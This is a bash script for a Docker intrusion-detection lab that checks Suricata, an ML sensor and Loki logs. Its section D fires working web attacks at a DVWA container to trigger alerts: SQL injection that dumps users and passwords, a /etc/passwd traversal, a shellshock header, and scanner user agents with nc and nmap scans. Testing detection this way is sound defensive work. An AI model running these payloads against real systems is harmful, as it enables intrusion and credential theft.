#!/usr/bin/env bash
set +e
PROJ=/home/operador/Laboratorio-MLCyber
NET=laboratorio-mlcyber_ids_network
DVWA_IP=172.25.0.50
sec() { echo; echo "===== $* ====="; }

sec "A. Suricata HOME_NET actual"
docker exec ids-suricata bash -c 'grep -A 3 "^\s*HOME_NET:" /etc/suricata/suricata.yaml 2>/dev/null | head -5'
docker exec ids-suricata bash -c 'grep -A 1 "^vars:" /etc/suricata/suricata.yaml 2>/dev/null | head -3'
# Buscar HOME_NET en toda la config
docker exec ids-suricata bash -c 'grep -i home_net /etc/suricata/suricata.yaml | head -5'

sec "B. Sensor: esperar a que termine"
for i in $(seq 1 30); do
  STATUS=$(curl -s http://localhost:9999/capture/status 2>/dev/null)
  ST=$(echo "$STATUS" | python3 -c 'import sys,json; print(json.loads(sys.stdin.read()).get("status","?"))' 2>/dev/null)
  FL=$(echo "$STATUS" | python3 -c 'import sys,json; print(json.loads(sys.stdin.read()).get("flows_extracted","?"))' 2>/dev/null)
  printf '  iter=%d status=%s flows=%s  ' "$i" "$ST" "$FL"
  if [ -f "$PROJ/logs/sensor_predictions.jsonl" ]; then
    LINES=$(wc -l < "$PROJ/logs/sensor_predictions.jsonl")
    printf 'predictions.jsonl=%s lineas\n' "$LINES"
  else
    echo 'predictions.jsonl: NO EXISTE'
  fi
  [ "$ST" = "completed" ] || [ "$ST" = "idle" ] && break
  sleep 6
done

sec "C. Sensor logs (ultimas 30 - ver si llama al ml_api)"
docker logs --tail 40 ids-sensor 2>&1 | tail -35

sec "D. Forzar alertas Suricata con tráfico de firmas conocidas"
# SQLi clasica con pattern '1=1', user-agents maliciosos, rutas sensibles
docker run --rm --network "$NET" curlimages/curl:latest sh -c '
TARGET="'"$DVWA_IP"'"
echo "-- firma: SQL injection pattern --"
curl -sS -o /dev/null -m 3 "http://$TARGET/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit" 2>&1
curl -sS -o /dev/null -m 3 "http://$TARGET/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--" 2>&1

echo "-- firma: Nikto user-agent (ET WEB_SERVER Nikto) --"
curl -sS -o /dev/null -m 3 -A "Mozilla/5.00 (Nikto/2.1.6)" "http://$TARGET/" 2>&1
curl -sS -o /dev/null -m 3 -A "Mozilla/4.75 [en] (Nikto/2.1.5)" "http://$TARGET/admin.php" 2>&1

echo "-- firma: sqlmap user-agent --"
curl -sS -o /dev/null -m 3 -A "sqlmap/1.5.12#stable" "http://$TARGET/?id=1" 2>&1

echo "-- firma: User-Agent curl en login + path /wp-admin --"
curl -sS -o /dev/null -m 3 "http://$TARGET/wp-admin/admin.php" 2>&1
curl -sS -o /dev/null -m 3 "http://$TARGET/phpmyadmin/" 2>&1

echo "-- firma: Directory traversal --"
curl -sS -o /dev/null -m 3 "http://$TARGET/../../../etc/passwd" 2>&1
curl -sS -o /dev/null -m 3 "http://$TARGET/cgi-bin/test.cgi?arg=%00" 2>&1

echo "-- firma: shellshock pattern --"
curl -sS -o /dev/null -m 3 -H "User-Agent: () { :;}; /bin/ls" "http://$TARGET/cgi-bin/test" 2>&1

echo "-- scan rapido SYN con nc (si disponible) --"
for p in 22 23 3306 5432 6379 8080 9000 27017; do
  nc -z -w1 "$TARGET" $p 2>&1
done
' 2>&1 | tail -20

echo '-- lanzar nmap full scan (visible para Suricata) --'
docker run --rm --network "$NET" instrumentisto/nmap \
  -sS -sV -T4 -p 1-500 "$DVWA_IP" 2>&1 | tail -10

sleep 5

sec "E. eve.json tras ataques agresivos"
wc -l "$PROJ/logs/eve.json"
python3 -c "
import json
counts = {}
alerts = []
with open('$PROJ/logs/eve.json') as f:
    for line in f:
        try:
            d = json.loads(line)
            t = d.get('event_type','?')
            counts[t] = counts.get(t,0)+1
            if t == 'alert':
                alerts.append(d)
        except: pass
print('-- conteo por event_type --')
for k,v in sorted(counts.items(), key=lambda x:-x[1]):
    print(f'  {k}: {v}')
print()
print(f'-- Total alertas: {len(alerts)} --')
for a in alerts[:5]:
    sig = a.get('alert',{}).get('signature','?')
    cat = a.get('alert',{}).get('category','?')
    sev = a.get('alert',{}).get('severity','?')
    src = a.get('src_ip','?')
    dst = a.get('dest_ip','?')
    print(f'  [sev={sev}] {src} -> {dst}  {sig} ({cat})')
"

sec "F. Loki: alertas ahora?"
docker exec ids-loki wget -qO- http://localhost:3100/loki/api/v1/label/event_type/values 2>/dev/null
echo
docker exec ids-loki wget -qO- http://localhost:3100/loki/api/v1/label/job/values 2>/dev/null
echo

sec "G. Predictions.jsonl final"
if [ -f "$PROJ/logs/sensor_predictions.jsonl" ]; then
  wc -l "$PROJ/logs/sensor_predictions.jsonl"
  echo '-- muestra (primeras 2 lineas) --'
  head -2 "$PROJ/logs/sensor_predictions.jsonl" | head -c 1200
  echo
else
  echo 'ARCHIVO NO EXISTE - sensor no termino'
fi

sec "H. Loki lineas + streams totales"
docker exec ids-loki wget -qO- http://localhost:3100/metrics 2>/dev/null | grep -E 'loki_distributor_lines_received_total|loki_ingester_streams_created_total' | head -5

echo; echo "===== FIN ====="
